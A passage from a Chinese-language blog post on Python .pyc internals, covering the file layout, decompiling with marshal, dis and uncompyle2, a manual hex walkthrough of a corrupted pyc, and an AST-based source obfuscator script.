rel="noopener">python源码头文件</a>，对于opcode的意义可以查<a href="https://docs.Python.org/2/library/dis.html" target="_blank" rel="noopener">https://docs.Python.org/2/library/dis.html</a></p><p>Python .pyc file structure代码</p><pre><code>============== &lt;- 文件起始。下面是文件头信息  pyc_magic     （=0xD1 0xF2 0x0D 0x0A，4字节，简单校验.pyc的魔数）  mtime         （4字节，.pyc对应的源文件的修改时间）  ============== &lt;- 顶层PyCodeObject起始。下面都属于顶层代码对象  TYPE_CODE     （=&apos;c&apos;，1字节，PyCodeObject的类型标识）  co_argscount  （4字节，位置参数的个数）  co_nlocals    （4字节，局部变量（包括位置参数）的个数）  co_stacksize  （4字节，求值栈的最大深度）  co_flags      （4字节，用来表示参数中是否有*args或者 **kwargs）  co_code       （PyStringObject，Code Block编译所得的字节码）  co_consts     （PyTupleObject，常量池）  co_names      （PyTupleObject，所有用到的符号的集合）  co_varnames   （PyTupleObject，局部变量名集合，在本代码段中赋值，但没有被内层代码引用的变量）  co_freevars   （PyTupleObject，自由变量的变量名集合，在本层引用，在外层赋值的变量）  co_cellvars   （PyTupleObject，被闭包捕获的局部变量的变量名集合，本层赋值，且被内层代码段引用的变量）  co_filename   （PyStringObject，源文件名，Code Block所对应的.py文件的完整路径）  co_name;      /* string (name, for reference) Code Block的名字，通常是函数名或类名*/  co_firstlineno（4字节，该代码对象中源码的首行对应行号）  co_lnotab     （PyStringObject，字节码偏移量与源码行号的对应关系）  ============== &lt;- 顶层PyCodeObject结束。文件结束 </code></pre><p>Pystringobject layout in .pyc files代码</p><pre><code>=========== &lt;- PyStringObject起始  TYPE_STRING（=&apos;s&apos;，1字节，PyStringObject的类型标识）  length     （4字节，字符串内容的长度）  data       （byte数组，字符串内容）  =========== &lt;- PyStringObject结束  </code></pre><p>co_consts常量表</p><pre><code>#define TYPE_NULL               &apos;0&apos;  #define TYPE_NONE               &apos;N&apos;  #define TYPE_FALSE              &apos;F&apos;  #define TYPE_TRUE               &apos;T&apos;  #define TYPE_STOPITER           &apos;S&apos;  #define TYPE_ELLIPSIS           &apos;.&apos;  #define TYPE_INT                &apos;i&apos;  #define TYPE_INT64              &apos;I&apos;  #define TYPE_FLOAT              &apos;f&apos;  #define TYPE_BINARY_FLOAT       &apos;g&apos;  #define TYPE_COMPLEX            &apos;x&apos;  #define TYPE_BINARY_COMPLEX     &apos;y&apos;  #define TYPE_LONG               &apos;l&apos;  #define TYPE_STRING             &apos;s&apos;  #define TYPE_INTERNED           &apos;t&apos;  #define TYPE_STRINGREF          &apos;R&apos;  #define TYPE_TUPLE              &apos;(&apos;  #define TYPE_LIST               &apos;[&apos;  #define TYPE_DICT               &apos;{&apos;  #define TYPE_CODE               &apos;c&apos;  #define TYPE_UNICODE            &apos;u&apos;  #define TYPE_UNKNOWN            &apos;?&apos;  #define TYPE_SET                &apos;&lt;&apos;  #define TYPE_FROZENSET          &apos;&gt;&apos;  </code></pre><h3 id="上手逆"><a href="#上手逆" class="headerlink" title="上手逆"></a>上手逆</h3><p>最简单的没做过处理的可以用这个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/wibiti/uncompyle2</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure><p>有经验的py程序员会在发布程序的时候修改pyc的字节比如头8个字节，这修改成不合法的，然后你反编译就失败了</p><p>可以用dis把二进制反编译CPython bytecode。用marshal把字符串转换成pyopcode对象，具体可以参考<a href="http://0x48.pw/2017/03/20/0x2f/#" target="_blank" rel="noopener">大佬</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import dis, marshal</span><br><span class="line">&gt;&gt;&gt; f = open(&quot;xxx.pyc&quot;)</span><br><span class="line">&gt;&gt;&gt; f.read(4)</span><br><span class="line">&apos;\x03\xf3\r\n&apos;               # magic number</span><br><span class="line">&gt;&gt;&gt; f.read(4)                # time</span><br><span class="line">&apos;f4oX&apos;</span><br><span class="line">&gt;&gt;&gt; code = marshal.load(f)</span><br><span class="line">&gt;&gt;&gt; code.co_argcount          # 参数的个数</span><br><span class="line">0</span><br><span class="line">&gt;&gt;&gt; code.co_varnames          # 局部变量</span><br><span class="line">()</span><br><span class="line">&gt;&gt;&gt; code.co_consts            # 常量 </span><br><span class="line">&gt;&gt;&gt; code.co_name              # 当前对象名 </span><br><span class="line">&gt;&gt;&gt; code.co_names  # 当前对象中使用的对象名</span><br><span class="line">&gt;&gt;&gt; code.co_code                  </span><br><span class="line">&apos;\x99\x00\x00\x99\x01\x00\x86\x00\x00\x91\x00\x00\x99\x02\x00\x88\x00\x00\x91\x01\x00\x99\x03\x00\x88\x00\x00\x91\x02\x00\x99\x01\x00S&apos;</span><br><span class="line"># CPython bytecode的二进制, 可以通过dis反编译</span><br><span class="line">&gt;&gt;&gt; dis.disassemble_string(code.co_code)</span><br><span class="line">          0 &lt;153&gt;               0</span><br><span class="line">          3 &lt;153&gt;               1</span><br><span class="line">          6 MAKE_CLOSURE        0</span><br><span class="line">          9 EXTENDED_ARG        0</span><br><span class="line">         12 &lt;153&gt;               2</span><br><span class="line">         15 LOAD_DEREF          0</span><br><span class="line">         18 EXTENDED_ARG        1</span><br><span class="line">         21 &lt;153&gt;               3</span><br><span class="line">         24 LOAD_DEREF          0</span><br><span class="line">         27 EXTENDED_ARG        2</span><br><span class="line">         30 &lt;153&gt;               1</span><br><span class="line">         33 RETURN_VALUE</span><br></pre></td></tr></table></figure></p><p>可以用showfile.py让结果更为清晰<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">import dis, marshal, struct, sys, time, types  </span><br><span class="line">  </span><br><span class="line">def show_file(fname):  </span><br><span class="line">    f = open(fname, &quot;rb&quot;)  </span><br><span class="line">    magic = f.read(4)  </span><br><span class="line">    moddate = f.read(4)  </span><br><span class="line">    modtime = time.asctime(time.localtime(struct.unpack(&apos;L&apos;, moddate)[0]))  </span><br><span class="line">    print &quot;magic %s&quot; % (magic.encode(&apos;hex&apos;))  </span><br><span class="line">    print &quot;moddate %s (%s)&quot; % (moddate.encode(&apos;hex&apos;), modtime)  </span><br><span class="line">    code = marshal.load(f)  </span><br><span class="line">    show_code(code)  </span><br><span class="line">       </span><br><span class="line">def show_code(code, indent=&apos;&apos;):  </span><br><span class="line">    old_indent = indent  </span><br><span class="line">    print &quot;%s&lt;code&gt;&quot; % indent  </span><br><span class="line">    indent += &apos;   &apos;  </span><br><span class="line">    print &quot;%s&lt;argcount&gt; %d &lt;/argcount&gt;&quot; % (indent, code.co_argcount)  </span><br><span class="line">    print &quot;%s&lt;nlocals&gt; %d&lt;/nlocals&gt;&quot; % (indent, code.co_nlocals)  </span><br><span class="line">    print &quot;%s&lt;stacksize&gt; %d&lt;/stacksize&gt;&quot; % (indent, code.co_stacksize)  </span><br><span class="line">    print &quot;%s&lt;flags&gt; %04x&lt;/flags&gt;&quot; % (indent, code.co_flags)  </span><br><span class="line">    show_hex(&quot;code&quot;, code.co_code, indent=indent)  </span><br><span class="line">    print &quot;%s&lt;dis&gt;&quot; % indent  </span><br><span class="line">    dis.disassemble(code)  </span><br><span class="line">    print &quot;%s&lt;/dis&gt;&quot; % indent  </span><br><span class="line">  </span><br><span class="line">    print &quot;%s&lt;names&gt; %r&lt;/names&gt;&quot; % (indent, code.co_names)  </span><br><span class="line">    print &quot;%s&lt;varnames&gt; %r&lt;/varnames&gt;&quot; % (indent, code.co_varnames)  </span><br><span class="line">    print &quot;%s&lt;freevars&gt; %r&lt;/freevars&gt;&quot; % (indent, code.co_freevars)  </span><br><span class="line">    print &quot;%s&lt;cellvars&gt; %r&lt;/cellvars&gt;&quot; % (indent, code.co_cellvars)  </span><br><span class="line">    print &quot;%s&lt;filename&gt; %r&lt;/filename&gt;&quot; % (indent, code.co_filename)  </span><br><span class="line">    print &quot;%s&lt;name&gt; %r&lt;/name&gt;&quot; % (indent, code.co_name)  </span><br><span class="line">    print &quot;%s&lt;firstlineno&gt; %d&lt;/firstlineno&gt;&quot; % (indent, code.co_firstlineno)  </span><br><span class="line">  </span><br><span class="line">    print &quot;%s&lt;consts&gt;&quot; % indent  </span><br><span class="line">    for const in code.co_consts:  </span><br><span class="line">        if type(const) == types.CodeType:  </span><br><span class="line">            show_code(const, indent+&apos;   &apos;)  </span><br><span class="line">        else:  </span><br><span class="line">            print &quot;   %s%r&quot; % (indent, const)  </span><br><span class="line">    print &quot;%s&lt;/consts&gt;&quot; % indent  </span><br><span class="line">  </span><br><span class="line">    show_hex(&quot;lnotab&quot;, code.co_lnotab, indent=indent)  </span><br><span class="line">    print &quot;%s&lt;/code&gt;&quot; % old_indent  </span><br><span class="line">       </span><br><span class="line">def show_hex(label, h, indent):  </span><br><span class="line">    h = h.encode(&apos;hex&apos;)  </span><br><span class="line">    if len(h) &lt; 60:  </span><br><span class="line">        print &quot;%s&lt;%s&gt; %s&lt;/%s&gt;&quot; % (indent, label, h,label)  </span><br><span class="line">    else:  </span><br><span class="line">        print &quot;%s&lt;%s&gt;&quot; % (indent, label)  </span><br><span class="line">        for i in range(0, len(h), 60):  </span><br><span class="line">            print &quot;%s   %s&quot; % (indent, h[i:i+60])  </span><br><span class="line">        print &quot;%s&lt;/%s&gt;&quot; % (indent, label)  </span><br><span class="line">  </span><br><span class="line">show_file(sys.argv[1])</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">showfile.py test.pyc &gt;test.xml</span><br></pre></td></tr></table></figure><p>很多情况会遇到损坏的pyc，于是就需要手动来逆，尝试逆了下一个文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">03f3 0d0apython版本</span><br><span class="line">6634 6f58.pyc对应的源文件的修改时间</span><br><span class="line">63=&apos;c&apos;，1字节，PyCodeObject的类型标识</span><br><span class="line">00 00 00 004字节，位置参数的个数</span><br><span class="line">00 00 00 004字节，局部变量（包括位置参数）的个数</span><br><span class="line">02 0000 004字节，求值栈的最大深度</span><br><span class="line">40 0000 004字节，用来表示参数中是否有*args或者 **kwargs</span><br><span class="line">73 =&apos;s&apos;，1字节，PyStringObject的类型标识</span><br><span class="line">2200 0000 4字节，字符串内容的长度</span><br><span class="line">9900 00</span><br><span class="line">99 0100 </span><br><span class="line">8600 00</span><br><span class="line">91 0000 </span><br><span class="line">9902 00 opcode</span><br><span class="line">88 0000</span><br><span class="line">9101 00</span><br><span class="line">99 0300 </span><br><span class="line">8800 00</span><br><span class="line">91 0200 </span><br><span class="line">9901 00</span><br><span class="line">53 </span><br><span class="line"></span><br><span class="line">28=&quot;(&quot; TYPE_TUPLE</span><br><span class="line">04 元组个数</span><br><span class="line">0000 00</span><br><span class="line">69 ffff ffff 69=&quot;i&quot;(TYPE_INT) -1</span><br><span class="line">4e =&quot;N&quot; TYPE_NONE</span><br><span class="line">63 =&apos;c&apos;，1字节，PyCodeObject的类型标识</span><br><span class="line">01 00 0000 4字节，位置参数的个数</span><br><span class="line">0600 0000 4字节，局部变量（包括位置参数）的个数</span><br><span class="line">0300 0000 4字节，求值栈的最大深度</span><br><span class="line">4300 0000 4字节，用来表示参数中是否有*args或者 **kwargs</span><br><span class="line">73=&apos;s&apos;，1字节，PyStringObject的类型标识</span><br><span class="line">5c 0000004字节，字符串内容的长度</span><br><span class="line"></span><br><span class="line">99 0100 6801 0099 0200 6802 0099 0300</span><br><span class="line">6803 0061 0100 9904 0046 9905 0027 6102</span><br><span class="line">0061 0100 2761 0300 2799 0600 4627 9905  opcode</span><br><span class="line">0027 6102 0099 0600 4627 9907 0027 6804</span><br><span class="line">009b 0000 6001 0061 0400 8301 0068 0500</span><br><span class="line">6105 0060 0200 6100 0083 0100 53</span><br><span class="line"></span><br><span class="line">28 =&quot;(&quot; TYPE_TUPLE</span><br><span class="line">08元组个数</span><br><span class="line">000000 </span><br><span class="line">4e    =&quot;N&quot; TYPE_NONE</span><br><span class="line">73 =&apos;s&apos;，1字节，PyStringObject的类型标识</span><br><span class="line">0800 0000 4字节，字符串内容的长度</span><br><span class="line">2140 2324 255e 262a   &quot;!@#$%^&amp;*&quot;</span><br><span class="line">74=&quot;t&quot; TYPE_INTERNED</span><br><span class="line">08 0000 00</span><br><span class="line">61 6263 6465 6667 68&quot;abcdefgh&quot;</span><br><span class="line"></span><br><span class="line">73 =&apos;s&apos;，1字节，PyStringObject的类型标识</span><br><span class="line">0600 0000 4字节，字符串内容的长度</span><br></pre></td></tr></table></figure></p><h3 id="防逆向"><a href="#防逆向" class="headerlink" title="防逆向"></a>防逆向</h3><ul><li>python是解释型语言，可以从代码层面做混淆，即使逆出来，也很难看懂，如果代码量很大的话，嘿嘿。可以使用pyminifier或在线源码混淆<a href="http://pyob.oxyry.com/" target="_blank" rel="noopener">http://pyob.oxyry.com/</a>，只是基本的文本查找与替换，更深层次使用AST<a href="http://jbremer.org/python-source-obfuscation-using-asts/" target="_blank" rel="noopener">http://jbremer.org/python-source-obfuscation-using-asts/</a></li></ul><p>obscutor.py<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line">import ast</span><br><span class="line">from ast import Assign, Name, Call, Store, Load, Str, Num, List, Add, BinOp</span><br><span class="line">from ast import Subscript, Slice, Attribute, GeneratorExp, comprehension</span><br><span class="line">from ast import Compare, Mult</span><br><span class="line">import codegen</span><br><span class="line">import random</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def random_string(minlength, maxlength):</span><br><span class="line">    return &apos;&apos;.join(chr(random.randint(0x61, 0x7a))</span><br><span class="line">                   for x in xrange(random.randint(minlength, maxlength)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def import_node(name, newname):</span><br><span class="line">    &quot;&quot;&quot;Import module obfuscation&quot;&quot;&quot;</span><br><span class="line">    # import sys -&gt; sys = __import__(&apos;sys&apos;, globals(), locals(), [], -1)</span><br><span class="line">    return Assign(</span><br><span class="line">        targets=[Name(id=newname, ctx=Store())],</span><br><span class="line">        value=Call(func=Name(id=&apos;__import__&apos;, ctx=Load()),</span><br><span class="line">                   args=[Str(s=name),</span><br><span class="line">                         Call(func=Name(id=&apos;globals&apos;, ctx=Load()), args=[],</span><br><span class="line">                              keywords=[], starargs=None, kwargs=None),</span><br><span class="line">                         Call(func=Name(id=&apos;locals&apos;, ctx=Load()), args=[],</span><br><span class="line">                              keywords=[], starargs=None, kwargs=None),</span><br><span class="line">                         List(elts=[], ctx=Load()), Num(n=-1)],</span><br><span class="line">                   keywords=[], starargs=None, kwargs=None))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def obfuscate_string(s):</span><br><span class="line">    &quot;&quot;&quot;Various String Obfuscation routines.&quot;&quot;&quot;</span><br><span class="line">    randstr = random_string(3, 10)</span><br><span class="line"></span><br><span class="line">    table0 = [</span><br><span class="line">        # &apos;&apos; -&gt; &apos;&apos;</span><br><span class="line">        lambda: Str(s=&apos;&apos;),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    table1 = [</span><br><span class="line">        # &apos;a&apos; -&gt; &apos;a&apos;</span><br><span class="line">        lambda x: Str(s=chr(x)),</span><br><span class="line">        # &apos;a&apos; -&gt; chr(0x61)</span><br><span class="line">        lambda x: Call(func=Name(id=&apos;chr&apos;, ctx=Load()), args=[Num(n=x)],</span><br><span class="line">                       keywords=[], starargs=None, kwargs=None),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    table = [</span><br><span class="line">        # &apos;abc&apos; -&gt; &apos;abc&apos;</span><br><span class="line">        lambda x: Str(s=x),</span><br><span class="line">        # &apos;abc&apos; -&gt; &apos;a&apos; + &apos;bc&apos;</span><br><span class="line">        lambda x: BinOp(left=Str(s=x[:len(x)/2]),</span><br><span class="line">                        op=Add(),</span><br><span class="line">                        right=Str(s=x[len(x)/2:])),</span><br><span class="line">        # &apos;abc&apos; -&gt; &apos;cba&apos;[::-1]</span><br><span class="line">        lambda x: Subscript(value=Str(s=x[::-1]),</span><br><span class="line">                            slice=Slice(lower=None, upper=None,</span><br><span class="line">                                        step=Num(n=-1)),</span><br><span class="line">                            ctx=Load()),</span><br><span class="line">        # &apos;abc&apos; -&gt; &apos;&apos;.join(_x for _x in reversed(&apos;cba&apos;))</span><br><span class="line">        lambda x: Call(</span><br><span class="line">            func=Attribute(value=Str(s=&apos;&apos;), attr=&apos;join&apos;, ctx=Load()), args=[</span><br><span class="line">                GeneratorExp(elt=Name(id=randstr, ctx=Load()), generators=[</span><br><span class="line">                    comprehension(target=Name(id=randstr, ctx=Store()),</span><br><span class="line">                                  iter=Call(func=Name(id=&apos;reversed&apos;,</span><br><span class="line">                                                      ctx=Load()),</span><br><span class="line">                                            args=[Str(s=x[::-1])],</span><br><span class="line">                                            keywords=[], starargs=None,</span><br><span class="line">                                            kwargs=None),</span><br><span class="line">                                  ifs=[])])],</span><br><span class="line">            keywords=[], starargs=None, kwargs=None),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    if not len(s):</span><br><span class="line">        return random.choice(table0)()</span><br><span class="line"></span><br><span class="line">    if len(s) == 1:</span><br><span class="line">        return random.choice(table1)(ord(s))</span><br><span class="line"></span><br><span class="line">    return random.choice(table)(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Obfuscator(ast.NodeTransformer):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        ast.NodeTransformer.__init__(self)</span><br><span class="line"></span><br><span class="line">        # imported modules</span><br><span class="line">        self.imports = &#123;&#125;</span><br><span class="line"></span><br><span class="line">        # global values (can be renamed)</span><br><span class="line">        self.globs = &#123;&#125;</span><br><span class="line"></span><br><span class="line">        # local values</span><br><span class="line">        self.locs = &#123;&#125;</span><br><span class="line"></span><br><span class="line">        # inside a function</span><br><span class="line">        self.indef = False</span><br><span class="line"></span><br><span class="line">    def obfuscate_global(self, name):</span><br><span class="line">        newname = random_string(3, 10)</span><br><span class="line">        self.globs[name] = newname</span><br><span class="line">        return newname</span><br><span class="line"></span><br><span class="line">    def obfuscate_local(self, name):</span><br><span class="line">        newname = random_string(3, 10)</span><br><span class="line">        self.locs[name] = newname</span><br><span class="line">        return newname</span><br><span class="line"></span><br><span class="line">    def visit_Import(self, node):</span><br><span class="line">        newname = self.obfuscate_global(node.names[0].name)</span><br><span class="line">        self.imports[node.names[0].name] = newname</span><br><span class="line"></span><br><span class="line">    def visit_If(self, node):</span><br><span class="line">        if isinstance(node.test, Compare) and \</span><br><span class="line">                isinstance(node.test.left, Name) and \</span><br><span class="line">                node.test.left.id == &apos;__name__&apos;:</span><br><span class="line">            for x, y in self.imports.items():</span><br><span class="line">                node.body.insert(0, import_node(x, y))</span><br><span class="line">        node.test = self.visit(node.test)</span><br><span class="line">        node.body = [self.visit(x) for x in node.body]</span><br><span class="line">        node.orelse = [self.visit(x) for x in node.orelse]</span><br><span class="line">        return node</span><br><span class="line"></span><br><span class="line">    def visit_Str(self, node):</span><br><span class="line">        return obfuscate_string(node.s)</span><br><span class="line"></span><br><span class="line">    def visit_Num(self, node):</span><br><span class="line">        d = random.randint(1, 256)</span><br><span class="line">        return BinOp(left=BinOp(left=Num(node.n / d), op=Mult(),</span><br><span class="line">                                right=Num(n=d)),</span><br><span class="line">                     op=Add(), right=Num(node.n % d))</span><br><span class="line"></span><br><span class="line">    def visit_Attribute(self, node):</span><br><span class="line">        if isinstance(node.value, Name) and isinstance(node.value.ctx, Load):</span><br><span class="line">            node.value = self.visit(node.value)</span><br><span class="line">            return Call(func=Name(id=&apos;getattr&apos;, ctx=Load()), args=[</span><br><span class="line">                Name(id=node.value.id, ctx=Load()), Str(s=node.attr)],</span><br><span class="line">                keywords=[], starargs=None, kwargs=None)</span><br><span class="line">        node.value = self.visit(node.value)</span><br><span class="line">        return node</span><br><span class="line"></span><br><span class="line">    def visit_FunctionDef(self, node):</span><br><span class="line">        self.indef = True</span><br><span class="line">        self.locs = &#123;&#125;</span><br><span class="line">        node.name = self.obfuscate_global(node.name)</span><br><span class="line">        node.body = [self.visit(x) for x in node.body]</span><br><span class="line">        self.indef = False</span><br><span class="line">        return node</span><br><span class="line"></span><br><span class="line">    def visit_Name(self, node):</span><br><span class="line">        # obfuscate known globals</span><br><span class="line">        if not self.indef and isinstance(node.ctx, Store) and \</span><br><span class="line">                node.id in (&apos;teamname&apos;, &apos;flag&apos;):</span><br><span class="line">            node.id = self.obfuscate_global(node.id)</span><br><span class="line">        #elif self.indef:</span><br><span class="line">            #if isinstance(node.ctx, Store):</span><br><span class="line">                #node.id = self.obfuscate_local(node.id)</span><br><span class="line">            #node.id = self.locs.get(node.id, node.id)</span><br><span class="line">        node.id = self.globs.get(node.id, node.id)</span><br><span class="line">        return node</span><br><span class="line"></span><br><span class="line">    def visit_Module(self, node):</span><br><span class="line">        node.body = [y for y in (self.visit(x) for x in node.body) if y]</span><br><span class="line">        node.body = [y for y in (self.visit(x) for x in node.body) if y]</span><br><span class="line">        return node</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class GlobalsEnforcer(ast.NodeTransformer):</span><br><span class="line">    def __init__(self, globs):</span><br><span class="line">        ast.NodeTransformer.__init__(self)</span><br><span class="line">        self.globs = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    def visit_Name(self, node):</span><br><span class="line">        node.id = self.globs.get(node.id, node.id)</span><br><span class="line">        return node</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    if len(sys.argv) != 2:</span><br><span class="line">        print &apos;Usage: python %s &lt;pyfile&gt;&apos; % sys.argv[0]</span><br><span class="line">        exit(0)</span><br><span class="line"></span><br><span class="line">    if sys.argv[1] == &apos;-&apos;:</span><br><span class="line">        root = ast.parse(sys.stdin.read())</span><br><span class="line">    else:</span><br><span class="line">        root = ast.parse(open(sys.argv[1], &apos;rb&apos;).read())</span><br><span class="line"></span><br><span class="line">    # obfuscate the AST</span><br><span class="line">    obf = Obfuscator()</span><br><span class="line">    root = obf.visit(root)</span><br><span class="line"></span><br><span class="line">    # resolve all global names</span><br><span class="line">    root = GlobalsEnforcer(obf.globs).visit(root)</span><br><span class="line"></span><br><span class="line">    print codegen.to_source(root)</span><br></pre></td></tr></table></figure></p><p>一个简单的py文件，写了递归相乘</p><figure class="highlight plain"><table><tr><td 